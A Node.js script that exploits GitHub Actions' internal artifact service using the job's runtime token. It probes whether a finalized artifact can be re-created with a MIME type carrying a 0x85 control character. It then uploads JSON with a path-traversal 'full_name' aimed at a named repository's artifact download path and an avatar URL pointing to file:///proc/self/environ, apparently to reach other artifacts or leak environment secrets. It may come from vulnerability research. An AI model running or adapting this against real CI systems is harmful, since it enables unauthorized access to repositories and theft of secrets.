const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  const EVIL = String.fromCharCode(0x85) + 'application/json';
  const name = 'glm1rc-' + Date.now() + '.json';
  const create = (mime) => fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: mime, version: 7 })
  });
  const putb = (sas, buf, mime) => fetch(sas, { method: 'PUT', headers: { 'Content-Type': mime, 'x-ms-blob-type': 'BlockBlob' }, body: buf });
  const fin = (buf) => fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(buf.length), hash: 'sha256:' + crypto.createHash('sha256').update(buf).digest('hex') })
  });
  // phase 1: clean create + finalize
  let cr = await create('application/json');
  let cj = await cr.json().catch(() => ({}));
  let sas = cj.signedUploadUrl || cj.signed_upload_url;
  if (!sas) { console.log('P1create', cr.status, JSON.stringify(cj).slice(0,140)); process.exit(2); }
  const ph = Buffer.from('{"full_name":"PH1"}');
  console.log('P1create', cr.status, 'PUT', (await putb(sas, ph, 'application/json')).status);
  let fr = await fin(ph); let fj = await fr.json().catch(() => ({}));
  const id1 = fj.artifact_id || fj.artifactId;
  console.log('P1fin', fr.status, 'id', id1);
  // phase 2: sequential RE-CREATE with evil mime (post-finalize)
  cr = await create(EVIL);
  cj = await cr.json().catch(() => ({}));
  const sas2 = cj.signedUploadUrl || cj.signed_upload_url;
  console.log('P2create-evil', cr.status, sas2 ? 'SAS-OK' : JSON.stringify(cj).slice(0,140));
  if (sas2) {
    const w = Buffer.from(JSON.stringify({ full_name: 'a/../../repos/lemonsour864/cassette/actions/artifacts/' + id1 + '/zip', owner: { login: 'u', avatar_url: 'file:///proc/self/environ' } }));
    console.log('P2PUT', (await putb(sas2, w, EVIL)).status, 'len', w.length);
    fr = await fin(w); fj = await fr.json().catch(() => ({}));
    console.log('P2fin', fr.status, 'id', fj.artifact_id || fj.artifactId);
  }
  // phase 3: re-create with CLEAN mime again (control: does re-create even mint a SAS?)
  cr = await create('application/json');
  cj = await cr.json().catch(() => ({}));
  console.log('P3create-clean', cr.status, (cj.signedUploadUrl || cj.signed_upload_url) ? 'SAS-OK' : JSON.stringify(cj).slice(0,140));
  console.log('ARTIFACT_ID=' + id1);
})().catch(e => { console.log('ERR', e.message); process.exit(1); });
